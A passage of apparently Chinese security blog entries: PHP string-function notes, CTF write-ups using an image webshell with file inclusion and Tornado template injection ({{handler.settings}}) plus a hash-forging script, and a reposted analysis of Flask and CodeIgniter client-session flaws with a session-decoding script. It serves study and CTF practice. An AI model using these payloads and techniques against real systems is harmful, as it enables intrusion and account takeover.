plain"><table><tr><td class="code"><pre><span class="line">var_dump(mb_strpos(&#39;开始23测试ceshi&#39;, &#39;测试&#39;));、</span><br><span class="line">                    0 1 234</span><br><span class="line">&#x2F;&#x2F;输出int(4)</span><br><span class="line">mb_strpos 按字处理</span><br></pre></td></tr></table></figure><hr><h3 id="mb-substr函数"><a href="#mb-substr函数" class="headerlink" title="mb_substr函数"></a>mb_substr函数</h3><p>mb_substr() 函数返回字符串的一部分，substr() 函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo mb_substr(&quot;菜鸟教程&quot;, 0, 2);</span><br><span class="line">&#x2F;&#x2F; 输出：菜鸟</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="copy函数"><a href="#copy函数" class="headerlink" title="copy函数"></a>copy函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy() 函数拷贝文件。   </span><br><span class="line">copy(source,destination)   </span><br><span class="line">source------------------------必需。规定要复制的文件。</span><br><span class="line">destination-------------------必需。规定复制文件的目的地。</span><br></pre></td></tr></table></figure><h3 id="strchr-函数"><a href="#strchr-函数" class="headerlink" title="strchr()函数"></a>strchr()函数</h3><p>查找 “world” 在 “Hello world!” 中的第一次出现，并返回此字符串的其余部分：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo strchr(&quot;Hello world!&quot;,&quot;world&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a>file_put_contents()函数</h3><p>函数把一个字符串写入文件中。</p><p><strong>语法：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int file_put_contents ( string $filename , mixed $data [, int $flags &#x3D; 0 [, resource $context ]] )</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">file</td><td align="left">必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</td></tr><tr><td align="left">data</td><td align="left">必需。规定要写入文件的数据。可以是字符串、数组或数据流。</td></tr><tr><td align="left">mode</td><td align="left">可选。规定如何打开/写入文件。可能的值：FILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC | What can images do</title>
      <link href="/undefined/%5BISCC%5DWhat%20can%20images%20do/"/>
      <url>/undefined/%5BISCC%5DWhat%20can%20images%20do/</url>
      
        <content type="html"><![CDATA[<h3 id="首先查看题目"><a href="#首先查看题目" class="headerlink" title="首先查看题目"></a>首先查看题目</h3><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/VStF8zR.png" alt="">   </p><p>尝试上传.php一句话   </p><p>如图：   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/ARa54YO.png" alt="">   </p><p>尝试抓包更改文件名后缀名   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/T0bYjsP.png" alt="">   </p><p>尝试大小写绕过，00截断之后无果，猜测是对文件内容进行了检测。   </p><p>尝试使用图片马绕过   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/vIk0ccQ.png" alt="">   </p><p>上传成功图片马   </p><p>尝试使用apache解析漏洞连接蚁剑失败   </p><p>后来得知使用文件包含   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/pcnqgCY.png" alt="">    </p><p>下面的图片存在文件包含漏洞   </p><p>payload：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.201.126.95:7004&#x2F;?filename&#x3D;..&#x2F;uploads&#x2F;2020&#x2F;05&#x2F;07&#x2F;6432185eb384c2c07a8631382360.jpg&amp;submit&#x3D;%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><p>蚁剑连接得到flag<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/gZQRTOW.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WEB安全漏洞 </category>
          
          <category> 文件上传漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片马绕过 | 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>客户端 session 导致的安全问题</title>
      <link href="/undefined/%E5%AE%A2%E6%88%B7%E7%AB%AF%20session%20%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
      <url>/undefined/%E5%AE%A2%E6%88%B7%E7%AB%AF%20session%20%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>在Web中，session是认证用户身份的凭证，它具备如下几个特点：  </p><ul><li>1.用户不可以任意篡改</li><li>2.A用户的session无法被B用户获取   </li></ul><p>也就是说，session的设计目的是为了做用户身份认证。但是，很多情况下，session被用作了别的用途，将产生一些安全问题，我们今天就来谈谈“客户端session”（client session）导致的安全问题。</p><h2 id="什么是客户端session"><a href="#什么是客户端session" class="headerlink" title="什么是客户端session"></a>什么是客户端session</h2><p>在传统PHP开发中，$_SESSION变量的内容默认会被保存在服务端的一个文件中，通过一个叫“PHPSESSID”的Cookie来区分用户。这类session是“服务端session”，用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。   </p><p>然而，并不是所有语言都有默认的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。   </p><p>因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。   </p><h2 id="保护客户端session"><a href="#保护客户端session" class="headerlink" title="保护客户端session"></a>保护客户端session</h2><p>将session存储在客户端cookie中，最重要的就是解决session不能被篡改的问题。  </p><p>我们看看flask是如何处理的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class SecureCookieSessionInterface(SessionInterface):</span><br><span class="line">    &quot;&quot;&quot;The default session interface that stores sessions in signed cookies</span><br><span class="line">    through the :mod:&#96;itsdangerous&#96; module.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    #: the salt that should be applied on top of the secret key for the</span><br><span class="line">    #: signing of cookie based sessions.</span><br><span class="line">    salt &#x3D; &#39;cookie-session&#39;</span><br><span class="line">    #: the hash function to use for the signature. The default is sha1</span><br><span class="line">    digest_method &#x3D; staticmethod(hashlib.sha1)</span><br><span class="line">    #: the name of the itsdangerous supported key derivation. The default</span><br><span class="line">    #: is hmac.</span><br><span class="line">    key_derivation &#x3D; &#39;hmac&#39;</span><br><span class="line">    #: A python serializer for the payload. The default is a compact</span><br><span class="line">    #: JSON derived serializer with support for some extra Python types</span><br><span class="line">    #: such as datetime objects or tuples.</span><br><span class="line">    serializer &#x3D; session_json_serializer</span><br><span class="line">    session_class &#x3D; SecureCookieSession</span><br><span class="line"></span><br><span class="line">    def get_signing_serializer(self, app):</span><br><span class="line">        if not app.secret_key:</span><br><span class="line">            return None</span><br><span class="line">        signer_kwargs &#x3D; dict(</span><br><span class="line">            key_derivation&#x3D;self.key_derivation,</span><br><span class="line">            digest_method&#x3D;self.digest_method</span><br><span class="line">        )</span><br><span class="line">        return URLSafeTimedSerializer(app.secret_key, salt&#x3D;self.salt,</span><br><span class="line">                                      serializer&#x3D;self.serializer,</span><br><span class="line">                                      signer_kwargs&#x3D;signer_kwargs)</span><br><span class="line"></span><br><span class="line">    def open_session(self, app, request):</span><br><span class="line">        s &#x3D; self.get_signing_serializer(app)</span><br><span class="line">        if s is None:</span><br><span class="line">            return None</span><br><span class="line">        val &#x3D; request.cookies.get(app.session_cookie_name)</span><br><span class="line">        if not val:</span><br><span class="line">            return self.session_class()</span><br><span class="line">        max_age &#x3D; total_seconds(app.permanent_session_lifetime)</span><br><span class="line">        try:</span><br><span class="line">            data &#x3D; s.loads(val, max_age&#x3D;max_age)</span><br><span class="line">            return self.session_class(data)</span><br><span class="line">        except BadSignature:</span><br><span class="line">            return self.session_class()</span><br><span class="line"></span><br><span class="line">    def save_session(self, app, session, response):</span><br><span class="line">        domain &#x3D; self.get_cookie_domain(app)</span><br><span class="line">        path &#x3D; self.get_cookie_path(app)</span><br><span class="line">        # Delete case. If there is no session we bail early.</span><br><span class="line">        # If the session was modified to be empty we remove the</span><br><span class="line">        # whole cookie.</span><br><span class="line">        if not session:</span><br><span class="line">            if session.modified:</span><br><span class="line">                response.delete_cookie(app.session_cookie_name,</span><br><span class="line">                                       domain&#x3D;domain, path&#x3D;path)</span><br><span class="line">            return</span><br><span class="line">        # Modification case. There are upsides and downsides to</span><br><span class="line">        # emitting a set-cookie header each request. The behavior</span><br><span class="line">        # is controlled by the :meth:&#96;should_set_cookie&#96; method</span><br><span class="line">        # which performs a quick check to figure out if the cookie</span><br><span class="line">        # should be set or not. This is controlled by the</span><br><span class="line">        # SESSION_REFRESH_EACH_REQUEST config flag as well as</span><br><span class="line">        # the permanent flag on the session itself.</span><br><span class="line">        if not self.should_set_cookie(app, session):</span><br><span class="line">            return</span><br><span class="line">        httponly &#x3D; self.get_cookie_httponly(app)</span><br><span class="line">        secure &#x3D; self.get_cookie_secure(app)</span><br><span class="line">        expires &#x3D; self.get_expiration_time(app, session)</span><br><span class="line">        val &#x3D; self.get_signing_serializer(app).dumps(dict(session))</span><br><span class="line">        response.set_cookie(app.session_cookie_name, val,</span><br><span class="line">                            expires&#x3D;expires, httponly&#x3D;httponly,</span><br><span class="line">                            domain&#x3D;domain, path&#x3D;path, secure&#x3D;secure)</span><br></pre></td></tr></table></figure><p>主要看最后两行代码，新建了URLSafeTimedSerializer类 ，用它的dumps方法将类型为字典的session对象序列化成字符串，然后用response.set_cookie将最后的内容保存在cookie中。</p><p>那么我们可以看一下URLSafeTimedSerializer是做什么的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Signer(object):</span><br><span class="line">    # ...</span><br><span class="line">    def sign(self, value):</span><br><span class="line">        &quot;&quot;&quot;Signs the given string.&quot;&quot;&quot;</span><br><span class="line">        return value + want_bytes(self.sep) + self.get_signature(value)</span><br><span class="line"></span><br><span class="line">    def get_signature(self, value):</span><br><span class="line">        &quot;&quot;&quot;Returns the signature for the given value&quot;&quot;&quot;</span><br><span class="line">        value &#x3D; want_bytes(value)</span><br><span class="line">        key &#x3D; self.derive_key()</span><br><span class="line">        sig &#x3D; self.algorithm.get_signature(key, value)</span><br><span class="line">        return base64_encode(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Serializer(object):</span><br><span class="line">    default_serializer &#x3D; json</span><br><span class="line">    default_signer &#x3D; Signer</span><br><span class="line">    # ....</span><br><span class="line">    def dumps(self, obj, salt&#x3D;None):</span><br><span class="line">        &quot;&quot;&quot;Returns a signed string serialized with the internal serializer.</span><br><span class="line">        The return value can be either a byte or unicode string depending</span><br><span class="line">        on the format of the internal serializer.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        payload &#x3D; want_bytes(self.dump_payload(obj))</span><br><span class="line">        rv &#x3D; self.make_signer(salt).sign(payload)</span><br><span class="line">        if self.is_text_serializer:</span><br><span class="line">            rv &#x3D; rv.decode(&#39;utf-8&#39;)</span><br><span class="line">        return rv</span><br><span class="line"></span><br><span class="line">    def dump_payload(self, obj):</span><br><span class="line">        &quot;&quot;&quot;Dumps the encoded object. The return value is always a</span><br><span class="line">        bytestring. If the internal serializer is text based the value</span><br><span class="line">        will automatically be encoded to utf-8.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        return want_bytes(self.serializer.dumps(obj))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class URLSafeSerializerMixin(object):</span><br><span class="line">    &quot;&quot;&quot;Mixed in with a regular serializer it will attempt to zlib compress</span><br><span class="line">    the string to make it shorter if necessary. It will also base64 encode</span><br><span class="line">    the string so that it can safely be placed in a URL.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def load_payload(self, payload):</span><br><span class="line">        decompress &#x3D; False</span><br><span class="line">        if payload.startswith(b&#39;.&#39;):</span><br><span class="line">            payload &#x3D; payload[1:]</span><br><span class="line">            decompress &#x3D; True</span><br><span class="line">        try:</span><br><span class="line">            json &#x3D; base64_decode(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise BadPayload(&#39;Could not base64 decode the payload because of &#39;</span><br><span class="line">                &#39;an exception&#39;, original_error&#x3D;e)</span><br><span class="line">        if decompress:</span><br><span class="line">            try:</span><br><span class="line">                json &#x3D; zlib.decompress(json)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                raise BadPayload(&#39;Could not zlib decompress the payload before &#39;</span><br><span class="line">                    &#39;decoding the payload&#39;, original_error&#x3D;e)</span><br><span class="line">        return super(URLSafeSerializerMixin, self).load_payload(json)</span><br><span class="line"></span><br><span class="line">    def dump_payload(self, obj):</span><br><span class="line">        json &#x3D; super(URLSafeSerializerMixin, self).dump_payload(obj)</span><br><span class="line">        is_compressed &#x3D; False</span><br><span class="line">        compressed &#x3D; zlib.compress(json)</span><br><span class="line">        if len(compressed) &lt; (len(json) - 1):</span><br><span class="line">            json &#x3D; compressed</span><br><span class="line">            is_compressed &#x3D; True</span><br><span class="line">        base64d &#x3D; base64_encode(json)</span><br><span class="line">        if is_compressed:</span><br><span class="line">            base64d &#x3D; b&#39;.&#39; + base64d</span><br><span class="line">        return base64d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer):</span><br><span class="line">    &quot;&quot;&quot;Works like :class:&#96;TimedSerializer&#96; but dumps and loads into a URL</span><br><span class="line">    safe string consisting of the upper and lowercase character of the</span><br><span class="line">    alphabet as well as &#96;&#96;&#39;_&#39;&#96;&#96;, &#96;&#96;&#39;-&#39;&#96;&#96; and &#96;&#96;&#39;.&#39;&#96;&#96;.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    default_serializer &#x3D; compact_json</span><br></pre></td></tr></table></figure><p>主要关注dump_payload、dumps，这是序列化session的主要过程。</p><p>可见，序列化的操作分如下几步：</p><ul><li>json.dumps 将对象转换成json字符串，作为数据</li><li>如果数据压缩后长度更短，则用zlib库进行压缩</li><li>将数据用base64编码</li><li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割<br>第4步就解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。</li></ul><p>最后，我们在cookie中就能看到设置好的session了：<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/gz9Z60g.png" alt=""><br>注意到，在第4步中，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p><h2 id="flask客户端session导致敏感信息泄露"><a href="#flask客户端session导致敏感信息泄露" class="headerlink" title="flask客户端session导致敏感信息泄露"></a>flask客户端session导致敏感信息泄露</h2><p>我曾遇到过一个案例，目标是flask开发的一个简历管理系统，在测试其找回密码功能的时候，我收到了服务端设置的session。</p><p>我在0x02中说过，flask是一个客户端session，所以看目标为flask的站点的时候，我习惯性地去解密其session。编写如下代码解密session：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig &#x3D; payload.rsplit(b&#39;.&#39;, 1)</span><br><span class="line">    payload, timestamp &#x3D; payload.rsplit(b&#39;.&#39;, 1)</span><br><span class="line"></span><br><span class="line">    decompress &#x3D; False</span><br><span class="line">    if payload.startswith(b&#39;.&#39;):</span><br><span class="line">        payload &#x3D; payload[1:]</span><br><span class="line">        decompress &#x3D; True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload &#x3D; base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#39;Could not base64 decode the payload because of &#39;</span><br><span class="line">                         &#39;an exception&#39;)</span><br><span class="line"></span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload &#x3D; zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#39;Could not zlib decompress the payload before &#39;</span><br><span class="line">                             &#39;decoding the payload&#39;)</span><br><span class="line"></span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure><p>例如，我解密0x02中演示的session：   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/hXx5sTj.png" alt="">   </p><p>通过解密目标站点的session，我发现其设置了一个名为token、值是一串md5的键。猜测其为找回密码的认证，将其替换到找回密码链接的token中，果然能够进入修改密码页面。通过这个过程，我就能修改任意用户密码了。</p><p>这是一个比较典型的安全问题，目标网站通过session来储存随机token并认证用户是否真的在邮箱收到了这个token。但因为flask的session是存储在cookie中且仅签名而未加密，所以我们就可以直接读取这个token了。   </p><h2 id="flask验证码绕过漏洞"><a href="#flask验证码绕过漏洞" class="headerlink" title="flask验证码绕过漏洞"></a>flask验证码绕过漏洞</h2><p>这是客户端session的另一个常见漏洞场景。</p><p>我们用一个实际例子认识这一点：<a href="https://github.com/shonenada/flask-captcha" target="_blank" rel="noopener">https://github.com/shonenada/flask-captcha</a> 。这是一个为flask提供验证码的项目，我们看到其中的view文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">try:</span><br><span class="line">    from cStringIO import StringIO</span><br><span class="line">except ImportError:</span><br><span class="line">    from io import BytesIO as StringIO</span><br><span class="line"></span><br><span class="line">from flask import Blueprint, make_response, current_app, session</span><br><span class="line">from wheezy.captcha.image import captcha</span><br><span class="line">from wheezy.captcha.image import background</span><br><span class="line">from wheezy.captcha.image import curve</span><br><span class="line">from wheezy.captcha.image import noise</span><br><span class="line">from wheezy.captcha.image import smooth</span><br><span class="line">from wheezy.captcha.image import text</span><br><span class="line">from wheezy.captcha.image import offset</span><br><span class="line">from wheezy.captcha.image import rotate</span><br><span class="line">from wheezy.captcha.image import warp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">captcha_bp &#x3D; Blueprint(&#39;captcha&#39;, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sample_chars():</span><br><span class="line">    characters &#x3D; current_app.config[&#39;CAPTCHA_CHARACTERS&#39;]</span><br><span class="line">    char_length &#x3D; current_app.config[&#39;CAPTCHA_CHARS_LENGTH&#39;]</span><br><span class="line">    captcha_code &#x3D; random.sample(characters, char_length)</span><br><span class="line">    return captcha_code</span><br><span class="line"></span><br><span class="line">@captcha_bp.route(&#39;&#x2F;captcha&#39;, endpoint&#x3D;&quot;captcha&quot;)</span><br><span class="line">def captcha_view():</span><br><span class="line">    out &#x3D; StringIO()</span><br><span class="line">    captcha_image &#x3D; captcha(drawings&#x3D;[</span><br><span class="line">        background(),</span><br><span class="line">        text(fonts&#x3D;current_app.config[&#39;CAPTCHA_FONTS&#39;],</span><br><span class="line">             drawings&#x3D;[warp(), rotate(), offset()]),</span><br><span class="line">        curve(),</span><br><span class="line">        noise(),</span><br><span class="line">        smooth(),</span><br><span class="line">    ])</span><br><span class="line">    captcha_code &#x3D; &#39;&#39;.join(sample_chars())</span><br><span class="line">    imgfile &#x3D; captcha_image(captcha_code)</span><br><span class="line">    session[&#39;captcha&#39;] &#x3D; captcha_code</span><br><span class="line">    imgfile.save(out, &#39;PNG&#39;)</span><br><span class="line">    out.seek(0)</span><br><span class="line">    response &#x3D; make_response(out.read())</span><br><span class="line">    response.content_type &#x3D; &#39;image&#x2F;png&#39;</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure><p>可见，其生成验证码后，就存储在session中了：session[‘captcha’] = captcha_code。</p><p>我们用浏览器访问/captcha，即可得到生成好的验证码图片，此时复制保存在cookie中的session值，用0x03中提供的脚本进行解码：<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/0568RyZ.png" alt=""><br>可见，我成功获取了验证码的值，进而可以绕过验证码的判断。</p><p>这也是客户端session的一种错误使用方法。</p><h2 id="CodeIgniter-2-1-4-session伪造及对象注入漏洞"><a href="#CodeIgniter-2-1-4-session伪造及对象注入漏洞" class="headerlink" title="CodeIgniter 2.1.4 session伪造及对象注入漏洞"></a>CodeIgniter 2.1.4 session伪造及对象注入漏洞</h2><p>Codeigniter 2的session也储存在session中，默认名为ci_session，默认值如下：   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/G1zysfj.png" alt="">   </p><p>可见，session数据被用PHP自带的serialize函数进行序列化，并签名后作为ci_session的值。原理上和flask如出一辙，我就不重述了。但好在codeigniter2支持对session进行加密，只需在配置文件中设置$config[‘sess_encrypt_cookie’] = TRUE;即可。</p><p>在CI2.1.4及以前的版本中，存在一个弱加密漏洞（ <a href="https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability" target="_blank" rel="noopener">https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability</a> ），如果目标环境中没有安装Mcrypt扩展，则CI会使用一个相对比较弱的加密方式来处理session:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function _xor_encode($string, $key)</span><br><span class="line">&#123;</span><br><span class="line"> $rand &#x3D; &#39;&#39;;</span><br><span class="line"> while (strlen($rand) &lt; 32)</span><br><span class="line"> &#123;</span><br><span class="line">  $rand .&#x3D; mt_rand(0, mt_getrandmax());</span><br><span class="line"> &#125;</span><br><span class="line"> $rand &#x3D; $this-&gt;hash($rand);</span><br><span class="line"> $enc &#x3D; &#39;&#39;;</span><br><span class="line"> for ($i &#x3D; 0; $i &lt; strlen($string); $i++)</span><br><span class="line"> &#123;</span><br><span class="line">  $enc .&#x3D; substr($rand, ($i % strlen($rand)), 1).(substr($rand, ($i % strlen($rand)), 1) ^ substr($string, $i, 1));</span><br><span class="line"> &#125;</span><br><span class="line"> return $this-&gt;_xor_merge($enc, $key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _xor_merge($string, $key)</span><br><span class="line">&#123;</span><br><span class="line"> $hash &#x3D; $this-&gt;hash($key);</span><br><span class="line"> $str &#x3D; &#39;&#39;;</span><br><span class="line"> for ($i &#x3D; 0; $i &lt; strlen($string); $i++)</span><br><span class="line"> &#123;</span><br><span class="line">  $str .&#x3D; substr($string, $i, 1) ^ substr($hash, ($i % strlen($hash)), 1);</span><br><span class="line"> &#125;</span><br><span class="line"> return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中用到了mt_rand、异或等存在大量缺陷的方法。我们通过几个简单的脚本（ <a href="https://github.com/Dionach/CodeIgniterXor" target="_blank" rel="noopener">https://github.com/Dionach/CodeIgniterXor</a> ），即可在4秒到4分钟的时间，破解CI2的密钥。</p><p>获取到了密钥，我们即可篡改任意session，并自己签名及加密，最后伪造任意用户，注入任意对象，甚至通过反序列化操作造成更大的危害。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我以三个案例来说明了客户端session的安全问题。</p><p>上述三个问题，如果session是储存在服务器文件或数据库中，则不会出现。当然，考虑到flask和ci都是非常轻量的web框架，很可能运行在无法操作文件系统或没有数据库的服务器上，所以客户端session是无法避免的。</p><p>除此之外，我还能想到其他客户端session可能存在的安全隐患：</p><p>签名使用hash函数而非hmac函数，导致利用hash长度扩展攻击来伪造session<br>任意文件读取导致密钥泄露，进一步造成身份伪造漏洞或反序列化漏洞（ <a href="http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E</a> ）<br>如果客户端session仅加密未签名，利用CBC字节翻转攻击，我们可以修改加密session中某部分数据，来达到身份伪造的目的<br>上面说的几点，各位CTF出题人可以拿去做文章啦~嘿嘿。</p><p>相对的，作为一个开发者，如果我们使用的web框架或web语言的session是存储在客户端中，那就必须牢记下面几点：</p><p>没有加密时，用户可以看到完整的session对象<br>加密/签名不完善或密钥泄露的情况下，用户可以修改任意session<br>使用强健的加密及签名算法，而不是自己造（反例discuz）</p><h3 id="摘自P师傅博客"><a href="#摘自P师傅博客" class="headerlink" title="摘自P师傅博客"></a>摘自P师傅博客</h3><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019强网杯&#39;&#39;随便注&#39;&#39;</title>
      <link href="/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/"/>
      <url>/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF | 2018护网杯(WEB)easy_tornado(模板注入)</title>
      <link href="/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/"/>
      <url>/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/</url>
      
        <content type="html"><![CDATA[<h1 id="考察知识点：模板注入"><a href="#考察知识点：模板注入" class="headerlink" title="考察知识点：模板注入"></a><center>考察知识点：模板注入</center></h1><p>打开页面发现三个链接依次打开，发现各自的文本<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/zsu1I4d.png" alt="1"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag in &#x2F;fllllllllllllag</span><br><span class="line">render</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>从上面三个信息得知flag在/fllllllllllllag文件中<br>render这个卡住了看了WP 说render是模板注入<br>第三个文件说了文件名的哈希方法     </p><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架</span><br><span class="line">(包括大多数 Python 的框架)有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure><p>然后就是这段代码md5(cookie_secret+md5(filename)) 根据之前打开文件的url参数分析这个就是filehash的值 想获得flag只要我们在url中传入/fllllllllllllag文件和filehash 经过这段代码处理的值即可关键就在这cookie_secret这块 我们得想办法获得cookie_secret    </p><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p><p>通过模板注入方式我们可以构造</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;de289baa-da8f-4380-954c-4b9c90a1ba95.node3.buuoj.cn&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">&#x2F;&#x2F;得到&#39;cookie_secret&#39;: &#39;bf0b29ee-5520-4b5b-a8a6-ffd19aa464f9&#39;&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/FNG9lhZ.png" alt="2"><br>得到secret后，就是计算访问flag文件的hash，获取flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename&#x3D;&#39;&#x2F;fllllllllllllag&#39;</span><br><span class="line">cookie_secret&#x3D;&quot;bf0b29ee-5520-4b5b-a8a6-ffd19aa464f9&quot;</span><br><span class="line">hash.update(filename.encode(&#39;utf-8&#39;))</span><br><span class="line">s1&#x3D;hash.hexdigest()</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line">hash.update((cookie_secret+s1).encode(&#39;utf-8&#39;))</span><br><span class="line">print(hash.hexdigest())</span><br><span 